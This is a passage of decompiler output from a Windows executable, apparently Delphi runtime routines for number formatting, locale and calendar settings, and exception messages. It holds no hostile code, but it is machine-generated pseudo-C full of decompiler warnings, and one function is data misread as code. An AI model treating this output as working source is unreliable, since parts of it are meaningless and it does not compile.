    ((int (*)())(*(char **)((char *)&off_40894C + 4 * v10 + v14) + v14))();
  }
  else
  {
    sub_40896F((int)&savedregs, v20);
    qmemcpy(v8, (char *)sub_408960 + 3 * v9 + v14, 3u);
    v8 += 3;
  }
  return v8 - v20;
}
// 4088FF: variable 'v9' is possibly undefined
// 40894C: using guessed type int (*off_40894C)();
// 408960: using guessed type int sub_408960();
// 42C728: using guessed type int dword_42C728;
// 42C72C: using guessed type char byte_42C72C;
// 42C72D: using guessed type char byte_42C72D;
// 42C72E: using guessed type char byte_42C72E;
// 42C72F: using guessed type char byte_42C72F;
// 408870: using guessed type unsigned __int16 var_2C;

//----- (00408966) --------------------------------------------------------
char __usercall sub_408966@<al>(char *a1@<esi>)
{
  char result; // al

  result = *a1;
  if ( !*a1 )
    return 48;
  return result;
}

//----- (0040896F) --------------------------------------------------------
char __usercall sub_40896F@<al>(int a1@<ebp>, _BYTE *a2@<edi>)
{
  char result; // al

  if ( *(_BYTE *)(a1 - 42) )
  {
    result = 45;
    *a2 = 45;
  }
  return result;
}

//----- (00408979) --------------------------------------------------------
char __usercall sub_408979@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>)
{
  signed int v3; // ecx
  int v4; // edx
  char result; // al
  _BYTE *v6; // edi
  char *v7; // edi
  unsigned int v8; // ecx
  char v9; // al
  __int16 v10; // ax

  sub_40896F(a1, a2);
  v3 = *(__int16 *)(a1 - 44);
  v4 = 0;
  if ( v3 > *(_DWORD *)(a1 + 12) || v3 < -3 )
  {
    v3 = 1;
    v4 = 1;
    do
    {
LABEL_7:
      v9 = *a3++;
      if ( !v9 )
      {
        result = 48;
        memset(a2, 48, v3);
        a2 += v3;
        goto LABEL_14;
      }
      *a2++ = v9;
      --v3;
    }
    while ( v3 );
    result = *a3++;
    if ( !result )
      goto LABEL_14;
    HIBYTE(v10) = result;
    LOBYTE(v10) = *(_BYTE *)(a1 - 5);
    *(_WORD *)a2 = v10;
    a2 += 2;
  }
  else
  {
    if ( v3 > 0 )
      goto LABEL_7;
    result = 48;
    *a2 = 48;
    v6 = a2 + 1;
    if ( !*a3 )
      return result;
    *v6 = *(_BYTE *)(a1 - 5);
    v7 = v6 + 1;
    v8 = -v3;
    memset(v7, 48, v8);
    a2 = &v7[v8];
  }
  while ( 1 )
  {
    result = *a3++;
    if ( !result )
      break;
    *a2++ = result;
  }
LABEL_14:
  if ( v4 )
    return sub_40882C(69, *(__int16 *)(a1 - 44) - 1, 0, *(_BYTE *)(a1 - 41), a2);
  return result;
}

//----- (00408A0E) --------------------------------------------------------
char __usercall sub_408A0E@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>)
{
  unsigned int v3; // edx
  int v4; // ecx
  char result; // al
  int v6; // ebx
  int v7; // ecx
  char v8; // al
  char v9; // al
  int v10; // edx

  sub_40896F(a1, a2);
  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 >= 0x12 )
    v3 = 18;
  v4 = *(__int16 *)(a1 - 44);
  if ( v4 > 0 )
  {
    v6 = 0;
    if ( *(_BYTE *)(a1 + 16) != 2 )
    {
      LOBYTE(v6) = (unsigned __int16)(v4 - 1) % 3u;
      ++v6;
    }
    while ( 1 )
    {
      result = sub_408966(a3);
      *a2++ = result;
      v4 = v7 - 1;
      if ( !v4 )
        break;
      if ( !--v6 )
      {
        v8 = *(_BYTE *)(a1 - 6);
        if ( v8 )
        {
          *a2++ = v8;
          LOBYTE(v6) = 3;
        }
      }
    }
  }
  else
  {
    result = 48;
    *a2++ = 48;
  }
  if ( v3 )
  {
    v9 = *(_BYTE *)(a1 - 5);
    if ( v9 )
      *a2++ = v9;
    if ( v4 )
    {
      result = 48;
      while ( 1 )
      {
        *a2++ = 48;
        if ( !--v3 )
          break;
        if ( !++v4 )
          goto LABEL_18;
      }
    }
    else
    {
      do
      {
LABEL_18:
        result = sub_408966(a3);
        *a2++ = result;
      }
      while ( v10 != 1 );
    }
  }
  return result;
}
// 408A45: variable 'v7' is possibly undefined
// 408A59: variable 'v3' is possibly undefined
// 408A75: variable 'v10' is possibly undefined

//----- (00408A78) --------------------------------------------------------
void __usercall sub_408A78(int a1@<ebp>, _BYTE *a2@<edi>)
{
  int v2; // ebx
  __int16 v3; // cx
  char *v4; // ebx
  int v5; // ecx
  char v6; // al
  int v7; // [esp-4h] [ebp-4h]

  v2 = *(unsigned __int8 *)(a1 - 13);
  v3 = 3;
  if ( *(_BYTE *)(a1 - 42) )
  {
    LOBYTE(v2) = *(_BYTE *)(a1 - 14);
    v3 = 1039;
  }
  if ( (unsigned __int8)v2 > (unsigned __int8)v3 )
    LOBYTE(v2) = v3;
  LOBYTE(v2) = HIBYTE(v3) + v2;
  v4 = (char *)sub_408ADB + 5 * v2 + *(_DWORD *)(a1 - 20);
  v5 = 5;
  do
  {
    v6 = *v4;
    if ( *v4 == 64 )
      break;
    v7 = v5;
    if ( v6 == 36 )
    {
      sub_408ACC(a1, a2);
    }
    else if ( v6 == 42 )
    {
      ((void (*)(void))loc_408A13)();
    }
    else
    {
      *a2++ = v6;
    }
    ++v4;
    v5 = v7 - 1;
  }
  while ( v7 != 1 );
}

//----- (00408ACC) --------------------------------------------------------
void __usercall sub_408ACC(int a1@<ebp>, void *a2@<edi>)
{
  const void *v2; // esi

  v2 = *(const void **)(a1 - 12);
  if ( v2 )
    qmemcpy(a2, v2, *((_DWORD *)v2 - 1));
}

//----- (00408ADB) --------------------------------------------------------
void __usercall sub_408ADB(int a1@<eax>, _BYTE *a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>)
{
  int v4; // eax

  LOBYTE(a1) = a1 & 0x2A;
  v4 = a1 + 3;
  BYTE1(v4) -= *(_BYTE *)(3 * v4);
  v4 += 2;
  LOBYTE(v4) = v4 & 0x20;
  LOBYTE(v4) = v4 - *(_BYTE *)(v4 + 64);
  BYTE1(v4) -= *(_BYTE *)v4;
  LOBYTE(v4) = v4 & 0x40;
  ++v4;
  a2[a4] -= BYTE1(v4);
  *(_DWORD *)(v4 + 45) -= v4;
  LOBYTE(v4) = v4 & 0x2A;
  v4 += 2;
  LOBYTE(v4) = v4 & 0x2D;
  LOBYTE(v4) = (v4 - *(_BYTE *)(v4 + 64)) & 0x2A;
  v4 -= 707280960;
  LOBYTE(v4) = v4 & 0x29;
  v4 -= 1077945385;
  LOBYTE(v4) = v4 & 0x2D;
  v4 += 2142355380;
  BYTE1(v4) -= *(_BYTE *)v4;
  LOBYTE(v4) = v4 & 0x2D;
  ++v4;
  LOBYTE(v4) = v4 & 0x20;
  BYTE1(a3) = BYTE1(a3) - MEMORY[0x2A404024] - MEMORY[0x2D202440];
  LOBYTE(v4) = v4 - *(_BYTE *)(v4 + 42);
  BYTE1(a3) -= *a3;
  *a2 -= BYTE1(a3);
  a3[a4] &= (unsigned __int16)(v4 - 9248) >> 8;
  JUMPOUT(0x408B3F);
}
// 408B3C: control flows out of bounds to 408B3F

//----- (00408B48) --------------------------------------------------------
_BYTE *__userpurge sub_408B48@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5)
{
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  if ( a3 )
    return sub_408C97(a1, (int)&savedregs, a2);
  else
    return (_BYTE *)sub_408B75(a1, (int)&savedregs, a2);
}

//----- (00408B75) --------------------------------------------------------
int __usercall sub_408B75@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>)
{
  __int16 v3; // dx
  int result; // eax
  long double v5; // st7
  int v8; // edi
  __int16 v9; // fps
  long double v10; // st6
  bool v11; // c0
  char v12; // c2
  bool v13; // c3
  _WORD *v14; // edi
  int v15; // edx
  __int16 v16; // ax
  int v17; // edi

  v3 = *(_WORD *)(a3 + 8);
  result = v3 & 0x7FFF;
  if ( (v3 & 0x7FFF) == 0 )
    goto LABEL_7;
  if ( result == 0x7FFF )
  {
    if ( *(__int16 *)(a3 + 6) >= 0 || !*(_DWORD *)a3 && *(_DWORD *)(a3 + 4) == 0x80000000 )
      goto LABEL_8;
    result = 0x8000;
LABEL_7:
    v3 = 0;
LABEL_8:
    *(_BYTE *)(a1 + 3) = 0;
    goto LABEL_28;
  }
  v5 = *(double *)a3;
  *(_DWORD *)(a2 - 8) = ((19728 * (result - 0x3FFF)) >> 16) + 1;
  _ST7 = fabs(v5);
  sub_40308C(18 - *(_DWORD *)(a2 - 8));
  __asm { frndint }
  v8 = *(_DWORD *)(a2 - 4);
  v10 = *(double *)((char *)&tbyte_42B118 + v8);
  v11 = v10 < _ST7;
  v12 = 0;
  v13 = v10 == _ST7;
  *(_WORD *)(a2 - 10) = v9;
  if ( (*(_WORD *)(a2 - 10) & 0x4100) != 0 )
  {
    _ST7 = _ST7 / (double)*(int *)((char *)&dword_42B124 + v8);
    ++*(_DWORD *)(a2 - 8);
  }
  __FBSTP__((_TBYTE *)(a2 - 24), _ST7);
  v14 = (_WORD *)(a1 + 3);
  v15 = 9;
  do
  {
    HIBYTE(v16) = *(_BYTE *)(v15 + a2 - 25);
    LOBYTE(v16) = HIBYTE(v16) >> 4;
    HIBYTE(v16) &= 0xFu;
    *v14++ = v16 + 12336;
    --v15;
  }
  while ( v15 );
  *(_BYTE *)v14 = 0;
  v17 = *(_DWORD *)(a2 + 8) + *(_DWORD *)(a2 - 8);
  if ( v17 < 0 )
  {
    result = 0;
    goto LABEL_7;
  }
  if ( (unsigned int)v17 >= *(_DWORD *)(a2 + 12) )
    v17 = *(_DWORD *)(a2 + 12);
  if ( (unsigned int)v17 >= 0x12 )
  {
    v17 = 18;
LABEL_24:
    while ( 1 )
    {
      *(_BYTE *)(a1 + v17-- + 3) = 0;
      if ( v17 < 0 )
        break;
      if ( *(_BYTE *)(a1 + v17 + 3) != 48 )
        goto LABEL_26;
    }
    v3 = 0;
  }
  else
  {
    if ( *(_BYTE *)(a1 + v17 + 3) < 0x35u )
      goto LABEL_24;
    while ( 1 )
    {
      *(_BYTE *)(a1 + v17-- + 3) = 0;
      if ( v17 < 0 )
        break;
      if ( ++*(_BYTE *)(a1 + v17 + 3) <= 0x39u )
        goto LABEL_26;
    }
    *(_WORD *)(a1 + 3) = 49;
    ++*(_DWORD *)(a2 - 8);
LABEL_26:
    v3 = *(_WORD *)(a3 + 8);
  }
  result = *(_DWORD *)(a2 - 8);
LABEL_28:
  *(_WORD *)a1 = result;
  *(_BYTE *)(a1 + 2) = v3 < 0;
  return result;
}
// 42B118: using guessed type _TBYTE tbyte_42B118;
// 42B124: using guessed type int dword_42B124;

//----- (00408C97) --------------------------------------------------------
_BYTE *__usercall sub_408C97@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>)
{
  unsigned __int64 v3; // rax
  int v4; // ecx
  int v5; // edi
  bool v6; // cf
  long double v7; // st7
  int v8; // edx
  _BYTE *v9; // edi
  int v10; // ecx
  unsigned __int8 v11; // ah
  char v12; // al
  char v13; // al
  _BYTE *result; // eax
  int v15; // edx

  v3 = *(_QWORD *)a3;
  if ( *(_QWORD *)a3 )
  {
    if ( (v3 & 0x8000000000000000ui64) != 0i64 )
      v3 = -(__int64)v3;
    v4 = 0;
    v5 = *(_DWORD *)(a2 + 8);
    if ( v5 < 0 )
      v5 = 0;
    if ( v5 >= 4 )
    {
      v5 = 4;
      do
      {
        ++v4;
        v6 = v3 < 0xDE0B6B3A7640000i64;
        v3 -= 1000000000000000000i64;
      }
      while ( !v6 );
      --v4;
      v3 += 1000000000000000000i64;
    }
    *(_QWORD *)(a2 - 32) = v3;
    v7 = (double)*(__int64 *)(a2 - 32);
    v8 = v5;
    if ( v5 != 4 )
      v7 = v7 / (double)*(int *)((char *)&loc_408C83 + 4 * (4 - v5) + *(_DWORD *)(a2 - 4));
    __FBSTP__((_TBYTE *)(a2 - 24), v7);
    v9 = (_BYTE *)(a1 + 3);
    if ( v4 )
    {
      *v9 = v4 + 48;
      v9 = (_BYTE *)(a1 + 4);
      v10 = 9;
      goto LABEL_19;
    }
    v10 = 9;
    while ( 1 )
    {
      v11 = *(_BYTE *)(v10 + a2 - 25);
      v12 = v11 >> 4;
      if ( v11 >> 4 )
        goto LABEL_20;
      v13 = v11 & 0xF;
      if ( (v11 & 0xF) != 0 )
        break;
      if ( !--v10 )
        goto LABEL_25;
    }
    while ( 1 )
    {
      *v9++ = v13 + 48;
      if ( !--v10 )
        break;
LABEL_19:
      v11 = *(_BYTE *)(v10 + a2 - 25);
      v12 = v11 >> 4;
LABEL_20:
      *v9++ = v12 + 48;
      v13 = v11 & 0xF;
    }
    result = &v9[-a1 - 3 - v8];
    do
      *v9-- = 0;
    while ( *v9 == 48 );
    v15 = *(_DWORD *)(a3 + 4) >> 31;
  }
  else
  {
LABEL_25:
    result = 0;
    LOBYTE(v15) = 0;
    *(_BYTE *)(a1 + 3) = 0;
  }
  *(_WORD *)a1 = (_WORD)result;
  *(_BYTE *)(a1 + 2) = v15;
  return result;
}

//----- (00408D74) --------------------------------------------------------
_DWORD *__usercall sub_408D74@<eax>(DWORD a1@<eax>, char **a2@<edx>)
{
  int i; // eax
  CHAR v4; // dl
  bool v5; // cf
  char v6; // dl
  CHAR Buffer[260]; // [esp+2h] [ebp-104h] BYREF

  for ( i = FormatMessageA(0x3000u, 0, a1, 0, Buffer, 0x100u, 0); i > 0; --i )
  {
    v4 = Buffer[i - 1];
    v5 = (unsigned __int8)v4 < 0x21u;
    v6 = v4 - 33;
    if ( !v5 && v6 != 13 )
      break;
  }
  return sub_40435C(a2, Buffer, i);
}

//----- (00408DC0) --------------------------------------------------------
volatile __int32 *__userpurge sub_408DC0@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, __int32 a3@<ecx>, volatile __int32 *a4)
{
  int LocaleInfoA_0; // eax
  CHAR LCData[256]; // [esp+8h] [ebp-100h] BYREF

  LocaleInfoA_0 = GetLocaleInfoA_0(a1, a2, LCData, 256);
  if ( LocaleInfoA_0 <= 0 )
    return sub_4042C0(a4, a3);
  else
    return sub_40435C((char **)a4, LCData, LocaleInfoA_0 - 1);
}

//----- (00408E0C) --------------------------------------------------------
int __usercall sub_408E0C@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, int a3@<ecx>)
{
  int result; // eax
  int LCData[4]; // [esp+0h] [ebp-10h] BYREF

  LCData[0] = a3;
  result = GetLocaleInfoA_0(a1, a2, (LPSTR)LCData, 2);
  if ( result <= 0 )
    return a3;
  LOBYTE(result) = LCData[0];
  return result;
}
// 408E0C: using guessed type int LCData[4];

//----- (00408E34) --------------------------------------------------------
int **__userpurge sub_408E34@<eax>(LCTYPE a1@<eax>, int a2@<edx>, int a3@<ecx>, volatile __int32 *a4, int a5, int a6)
{
  int **result; // eax

  result = (int **)sub_408DC0(*(_DWORD *)(a6 - 4), a1, 0, a4);
  if ( !*a4 )
    return sub_4063D4(*(int ***)(a3 + 4 * a2), (char **)a4);
  return result;
}

//----- (00408E70) --------------------------------------------------------
int __usercall sub_408E70@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ebx
  volatile __int32 *v4; // esi
  volatile __int32 *v5; // edi
  int v6; // ebx
  volatile __int32 *v7; // esi
  volatile __int32 *v8; // edi
  unsigned int v10[2]; // [esp-18h] [ebp-30h] BYREF
  int *v11; // [esp-10h] [ebp-28h]
  int v12; // [esp-Ch] [ebp-24h]
  int v13; // [esp-8h] [ebp-20h]
  int v14; // [esp-4h] [ebp-1Ch]
  __int32 v15; // [esp+0h] [ebp-18h] BYREF
  __int32 v16; // [esp+4h] [ebp-14h] BYREF
  __int32 v17; // [esp+8h] [ebp-10h] BYREF
  __int32 v18; // [esp+Ch] [ebp-Ch] BYREF
  int v19; // [esp+10h] [ebp-8h]
  LCID ThreadLocale_0; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  ThreadLocale_0 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a1;
  v13 = a3;
  v12 = a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_408F83;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  ThreadLocale_0 = GetThreadLocale_0();
  v3 = 1;
  v4 = dword_42C750;
  v5 = dword_42C780;
  do
  {
    sub_408E34(v3 + 67, v3 - 1, (int)off_42B128, &v18, 11, (int)&savedregs);
    sub_4042C0(v4, v18);
    sub_408E34(v3 + 55, v3 - 1, (int)off_42B158, &v17, 11, (int)&savedregs);
    sub_4042C0(v5, v17);
    ++v3;
    ++v5;
    ++v4;
  }
  while ( v3 != 13 );
  v6 = 1;
  v7 = dword_42C7B0;
  v8 = dword_42C7CC;
  do
  {
    v19 = (v6 + 5) % 7;
    sub_408E34(v19 + 49, v6 - 1, (int)off_42B188, &v16, 6, (int)&savedregs);
    sub_4042C0(v7, v16);
    sub_408E34(v19 + 42, v6 - 1, (int)off_42B1A4, &v15, 6, (int)&savedregs);
    sub_4042C0(v8, v15);
    ++v6;
    ++v8;
    ++v7;
  }
  while ( v6 != 8 );
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_408F8A;
  return sub_404290((int)&v15, 4);
}
// 408E70: could not find valid save-restore pair for ebx
// 408E70: could not find valid save-restore pair for edi
// 408E70: could not find valid save-restore pair for esi
// 42B128: using guessed type int **off_42B128[38];
// 42B158: using guessed type int **off_42B158[26];
// 42B188: using guessed type int **off_42B188[14];
// 42B1A4: using guessed type int **off_42B1A4[7];
// 42C750: using guessed type int dword_42C750[12];
// 42C780: using guessed type int dword_42C780[12];
// 42C7B0: using guessed type int dword_42C7B0[7];
// 42C7CC: using guessed type int dword_42C7CC[7];

//----- (00408F94) --------------------------------------------------------
BOOL __stdcall CalInfoEnumProc(LPSTR a1)
{
  int v1; // esi
  int i; // ebx

  v1 = 0;
  for ( i = 1; dword_42C7F4[i]; ++i )
  {
    if ( i == 7 )
      return v1;
  }
  sub_40445C((char **)&dword_42C7F4[i], a1);
  return 1;
}
// 42C7F4: using guessed type int dword_42C7F4[];

//----- (00408FD0) --------------------------------------------------------
BOOL __stdcall sub_408FD0(LPSTR a1)
{
  int v1; // esi
  int i; // ebx
  char *v3; // ecx
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_409035;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = 0;
  for ( i = 1; dword_42C810[i] != -1; ++i )
  {
    if ( i == 7 )
      goto LABEL_6;
  }
  sub_40445C(&v7, a1);
  dword_42C810[i] = sub_407C64((int)v7, 0, v3);
  v1 = 1;
LABEL_6:
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40903C;
  sub_40426C(&v7);
  return v1;
}
// 40900E: variable 'v3' is possibly undefined
// 42C810: using guessed type int dword_42C810[];

//----- (00409048) --------------------------------------------------------
_DWORD *sub_409048()
{
  LCID ThreadLocale_0; // eax
  char *v1; // ecx
  int v2; // esi
  LCID v3; // eax
  int v4; // edx
  _DWORD *v5; // eax
  LCID v6; // eax
  unsigned int v8[2]; // [esp-10h] [ebp-14h] BYREF
  int *v9; // [esp-8h] [ebp-Ch]
  __int32 v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4090DF;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408DC0(ThreadLocale_0, 0x100Bu, (__int32)&dword_4090F4, &v10);
  v2 = sub_407C64(v10, 1, v1);
  if ( (unsigned int)(v2 - 3) < 3 )
  {
    v3 = GetThreadLocale_0();
    EnumCalendarInfoA(CalInfoEnumProc, v3, v2, 4u);
    v4 = 7;
    v5 = &unk_42C814;
    do
    {
      *v5++ = -1;
      --v4;
    }
    while ( v4 );
    v6 = GetThreadLocale_0();
    EnumCalendarInfoA(sub_408FD0, v6, v2, 3u);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4090E6;
  return sub_40426C(&v10);
}
// 40907C: variable 'v1' is possibly undefined
// 4090F4: using guessed type int dword_4090F4;

//----- (004090F8) --------------------------------------------------------
int __usercall sub_4090F8@<eax>(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v7; // ebx
  LCID ThreadLocale_0; // eax
  char *v9; // ecx
  unsigned int v12[2]; // [esp-18h] [ebp-2Ch] BYREF
  int *v13; // [esp-10h] [ebp-24h]
  int v14; // [esp-Ch] [ebp-20h]
  int v15; // [esp-8h] [ebp-1Ch]
  int v16; // [esp-4h] [ebp-18h]
  char *v17; // [esp+0h] [ebp-14h] BYREF
  char *v18; // [esp+4h] [ebp-10h] BYREF
  char *v19; // [esp+8h] [ebp-Ch] BYREF
  __int32 v20; // [esp+Ch] [ebp-8h] BYREF
  int v21; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = a3;
  v15 = a5;
  v14 = a4;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_4092C2;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v7 = 1;
  sub_40426C(a2);
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408DC0(ThreadLocale_0, 0x1009u, (__int32)&dword_4092D8, &v20);
  if ( (unsigned int)(sub_407C64(v20, 1, v9) - 3) < 3 )
  {
    while ( v7 <= sub_404524((int)a1) )
    {
      if ( _bittest(&dword_42B0C0, (unsigned __int8)a1[v7 - 1]) )
      {
        v21 = sub_409E40(a1, v7);
        Delphi_Copy_40477C((int)a1, v7, v21, &v18);
        sub_40452C(a2, (__int32)v18);
        v7 += v21;
      }
      else
      {
        if ( sub_408194(&a1[v7 - 1], dword_4092DC, 2) )
        {
          if ( sub_408194(&a1[v7 - 1], "yyyy", 4) )
          {
            if ( sub_408194(&a1[v7 - 1], "yy", 2) )
            {
              if ( a1[v7 - 1] == 89 || a1[v7 - 1] == 121 )
              {
                sub_40452C(a2, (__int32)&dword_40931C);
              }
              else
              {
                sub_40444C(&v17);
                sub_40452C(a2, (__int32)v17);
              }
            }
            else
            {
              sub_40452C(a2, (__int32)dword_409310);
              ++v7;
            }
          }
          else
          {
            sub_40452C(a2, (__int32)"eeee");
            v7 += 3;
          }
        }
        else
        {
          sub_40452C(a2, (__int32)&dword_4092E8);
          ++v7;
        }
        ++v7;
      }
    }
  }
  else if ( dword_42C7EC == 4 || (unsigned int)(dword_42C7EC - 17) < 2 )
  {
    while ( v7 <= sub_404524((int)a1) )
    {
      if ( a1[v7 - 1] != 71 && a1[v7 - 1] != 103 )
      {
        sub_40444C(&v19);
        sub_40452C(a2, (__int32)v19);
      }
      ++v7;
    }
  }
  else
  {
    sub_4042C0((volatile __int32 *)a2, (__int32)a1);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_4092C9;
  return sub_404290((int)&v17, 4);
}
// 4090F8: could not find valid save-restore pair for ebx
// 4090F8: could not find valid save-restore pair for edi
// 4090F8: could not find valid save-restore pair for esi
// 409143: variable 'v9' is possibly undefined
// 4092D8: using guessed type int dword_4092D8;
// 4092DC: using guessed type int dword_4092DC[3];
// 4092E8: using guessed type int dword_4092E8;
// 409310: using guessed type int dword_409310[3];
// 40931C: using guessed type int dword_40931C;
// 42B0C0: using guessed type int dword_42B0C0;
// 42C7EC: using guessed type int dword_42C7EC;

//----- (00409320) --------------------------------------------------------
int __usercall sub_409320@<eax>(int result@<eax>)
{
  if ( result )
    result -= 4096;
  return result;
}

//----- (0040932C) --------------------------------------------------------
unsigned int __userpurge sub_40932C@<eax>(int a1@<eax>, const void *a2@<edx>, const char *a3@<ecx>, unsigned int a4)
{
  _BYTE *v6; // eax
  char *v7; // ebx
  int *v8; // edi
  unsigned int v9; // eax
  HINSTANCE v10; // eax
  int *v12; // [esp-Ch] [ebp-470h]
  char v13[256]; // [esp+Ch] [ebp-458h] BYREF
  char *v14; // [esp+10Ch] [ebp-358h] BYREF
  char v15; // [esp+110h] [ebp-354h]
  char *v16; // [esp+114h] [ebp-350h]
  char v17; // [esp+118h] [ebp-34Ch]
  int v18; // [esp+11Ch] [ebp-348h]
  char v19; // [esp+120h] [ebp-344h]
  char *v20; // [esp+124h] [ebp-340h]
  char v21; // [esp+128h] [ebp-33Ch]
  int *v22; // [esp+12Ch] [ebp-338h]
  char v23; // [esp+130h] [ebp-334h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+134h] [ebp-330h] BYREF
  CHAR v25[256]; // [esp+152h] [ebp-312h] BYREF
  CHAR Filename[261]; // [esp+252h] [ebp-212h] BYREF
  char v27[261]; // [esp+357h] [ebp-10Dh] BYREF
  int v28; // [esp+45Ch] [ebp-8h]
  const char *v29; // [esp+460h] [ebp-4h]

  v29 = a3;
  VirtualQuery_0(a2, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_0((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v28 = (_BYTE *)a2 - (_BYTE *)Buffer.AllocationBase;
  }
  else
  {
    GetModuleFileNameA_0(hmod, Filename, 0x105u);
    v28 = sub_409320((int)a2);
  }
  v6 = sub_409F54((unsigned __int8 *)Filename, 0x5Cu);
  sub_408118(v27, v6 + 1, 260);
  v7 = (char *)&dword_4094AC;
  v8 = &dword_4094AC;
  if ( sub_4036C0((int *)a1, (int)dword_406E88) )
  {
    v7 = sub_40471C(*(char **)(a1 + 4));
    v9 = sub_4080F0(v7);
    if ( v9 )
    {
      if ( v7[v9 - 1] != 46 )
        v8 = &dword_4094B0;
    }
  }
  v12 = off_42BA88[0][1];
  v10 = (HINSTANCE)sub_40593C((int)hmod);
  LoadStringA_0(v10, (UINT)v12, v25, 256);
  sub_403484(*(_DWORD *)a1, v13);
  v14 = v13;
  v15 = 4;
  v16 = v27;
  v17 = 6;
  v18 = v28;
  v19 = 5;
  v20 = v7;
  v21 = 6;
  v22 = v8;
  v23 = 6;
  sub_408718((int)v29, a4, v25, 4, (int)&v14);
  return sub_4080F0(v29);
}
// 406E88: using guessed type int dword_406E88[2];
// 4094AC: using guessed type int dword_4094AC;
// 4094B0: using guessed type int dword_4094B0;
// 42BA88: using guessed type int **off_42BA88[3];

//----- (004094B4) --------------------------------------------------------
int __usercall sub_4094B4@<eax>(int a1@<eax>, const void *a2@<edx>)
{
  int v2; // ecx
  HANDLE StdHandle_0; // eax
  HANDLE v4; // eax
  HINSTANCE v6; // eax
  unsigned int v7; // [esp-Ch] [ebp-450h]
  int *v8; // [esp-Ch] [ebp-450h]
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-444h] BYREF
  CHAR Caption[64]; // [esp+4h] [ebp-440h] BYREF
  char Buffer[1024]; // [esp+44h] [ebp-400h] BYREF

  sub_40932C(a1, a2, Buffer, 0x400u);
  if ( *off_42B9E8 )
  {
    sub_402D68((int)off_42B8B8, v2);
    v7 = sub_4080F0(Buffer);
    StdHandle_0 = GetStdHandle_0(0xFFFFFFF5);
    WriteFile_0(StdHandle_0, Buffer, v7, &NumberOfBytesWritten, 0);
    v4 = GetStdHandle_0(0xFFFFFFF5);
    return WriteFile_0(v4, &dword_409564, 2u, &NumberOfBytesWritten, 0);
  }
  else
  {
    v8 = off_42B88C[0][1];
    v6 = (HINSTANCE)sub_40593C((int)hmod);
    LoadStringA_0(v6, (UINT)v8, Caption, 64);
    return MessageBoxA_0(0, Buffer, Caption, 0x2010u);
  }
}
// 4094D7: variable 'v2' is possibly undefined
// 409564: using guessed type int dword_409564;
// 42B88C: using guessed type int **off_42B88C[7];
// 42B8B8: using guessed type void *off_42B8B8;
// 42B9E8: using guessed type char *off_42B9E8;

//----- (00409568) --------------------------------------------------------
_DWORD *__usercall sub_409568@<eax>(int a1@<eax>, char a2@<dl>, __int32 a3@<ecx>)
{
  char v3; // bl
  _DWORD *v4; // edi
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = sub_403864(a1, a2, v6);
  v3 = a2;
  v4 = (_DWORD *)a1;
  sub_4042C0((volatile __int32 *)(a1 + 4), a3);
  if ( v3 )
    sub_4038BC(v4);
  return v4;
}
// 409572: variable 'v6' is possibly undefined
// 409579: variable 'a2' is possibly undefined
// 409582: variable 'a3' is possibly undefined

//----- (004095A4) --------------------------------------------------------
int __userpurge sub_4095A4@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5)
{
  char v5; // bl
  int v6; // edi
  unsigned int v8[2]; // [esp-28h] [ebp-2Ch] BYREF
  int *v9; // [esp-20h] [ebp-24h]
  char v10; // [esp-1Ch] [ebp-20h]
  char *v11; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  if ( a2 )
    a1 = sub_403864(a1, a2, v10);
  v5 = a2;
  v6 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4095FE;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_408758(a3, a5, a4, &v11);
  sub_4042C0((volatile __int32 *)(v6 + 4), (__int32)v11);
  __writefsdword(0, v8[0]);
